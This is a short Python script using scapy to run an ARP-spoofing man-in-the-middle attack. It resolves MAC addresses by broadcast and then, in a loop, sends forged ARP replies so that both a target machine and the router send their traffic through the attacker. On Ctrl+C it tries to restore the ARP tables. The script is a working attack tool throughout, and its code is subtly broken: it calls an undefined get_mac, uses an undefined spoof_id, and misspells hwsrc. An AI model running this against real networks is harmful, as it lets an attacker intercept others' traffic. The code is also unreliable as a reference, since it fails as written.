#!/usr/bin/python

import scapy.all as scapy
import time

# List all fields we can set for scapy.ARP class. Used for packets.
# scapy.ls(scapy.ARP)

'''
Returns the MAC Address of the IP Address passed to the function. Broadcast sent using IP, 
asking who has this IP. Broadcast sent using srp function. A list of answers is returned. 
Only require first element in the list (answered_list).
'''
def get_mac_address(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	
	return answered_list[0][1].hwsrc


'''
Creating an ARP packet. Used to inform target machine that you have the router's MAC address
op=2 send as an ARP response, pdst sets the destination IP (IP of the target Windows machine,
hwdst hardware destination which again is the AMC address of the target machine, psrc source 
IP to the IP of the router. 

Place attacker in the middle. The target machine associates the MAC address 
associated to the routers IP has been replaced by attacker machine to itself.
'''
def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_id)
	# print(packet.show())
	# print(packet.summary())
	scapy.send(packet, count=4, verbose=False)


def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hswrc=source_mac)
	# print(packet.show())
	# print(packet.summary())
	scapy.send(packet, verbose=False)

sent_packets_count = 0
try:
	while True:
		# Attacker spoofing the Client stating we are the router
		spoof("xx.x.x.x", "yy.y.y.y")
		# Attacker spoofing the Router stating we are the target machine
		spoof("yy.y.y.y", "xx.x.x.x")

		# Formatting console output.
		sent_packets_count += 2
		print("\r[+] Packets sent: " +  str(sent_packets_count), end="")
		# Python 2 need to force a flush to the buffer. sys.stdout.flush()	

		# Sleep for two seconds before re-execution of the while loop
		time.sleep(2)
except KeyboardInterrupt:
	print("[-] Resetting ARP tables... Please wait.")
	restore("xx.x.x.x", "yy.y.y.y")
	print("[-] Detected CTRL + C ... Quitting.")
